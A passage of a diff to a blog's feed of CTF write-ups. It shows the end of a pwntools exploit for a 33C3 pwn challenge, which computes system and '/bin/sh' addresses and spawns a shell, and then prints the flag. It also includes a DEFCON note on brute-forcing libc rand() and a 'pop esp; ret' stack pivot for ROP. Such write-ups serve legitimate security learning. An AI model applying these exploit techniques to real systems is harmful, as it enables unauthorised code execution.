-    &lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lsm_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x144a4f&lt;/span&gt; 
-	
-    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsm: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lsm_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;system: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bin_sh: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;nums&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;polish_sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nums&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# this time will call system(&quot;/bin/sh&quot;)&lt;/span&gt;
-    
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The flag is in &lt;code class=&quot;highlighter-rouge&quot;&gt;/challenge/flag.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;33C3_L0rd_Nikon_would_l3t_u_1n&lt;/code&gt;&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="33C3" /><category term="CTF" /><category term="Python" /><category term="Pwnable" /><summary type="html">Category: pwn Points: 200</summary></entry></feed>
+&lt;p&gt;And that’s when I found that the “self-implement random” function is actually just &lt;code class=&quot;highlighter-rouge&quot;&gt;srand()&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;rand()&lt;/code&gt; in libc. According to &lt;a href=&quot;https://github.com/mehQQ&quot;&gt;meh&lt;/a&gt; from HITCON, you can just brute-force the desired return address. Moreover, because the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer address is right under the return address, so you can just use &lt;code class=&quot;highlighter-rouge&quot;&gt;pop esp; ret&lt;/code&gt; to migrate the stack into &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="Python" /><category term="C" /><category term="DEFCON" /><category term="CTF" /><category term="Pwnable" /><category term="ROP" /><category term="BOF" /><category term="file_stream_pointer_overflow" /><summary type="html">Category: Potent Pwnables</summary></entry></feed>
